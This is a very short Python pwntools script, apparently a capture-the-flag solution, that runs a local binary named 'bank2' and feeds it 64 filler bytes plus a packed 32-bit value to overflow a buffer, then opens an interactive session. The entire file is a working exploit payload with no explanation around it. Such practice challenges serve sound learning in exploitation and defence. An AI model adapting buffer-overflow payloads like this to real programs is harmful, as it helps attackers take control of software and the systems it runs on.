from pwn import *

p = process('./bank2')
p.sendline(b'x'*64 + p32(0x66A44))

p.interactive()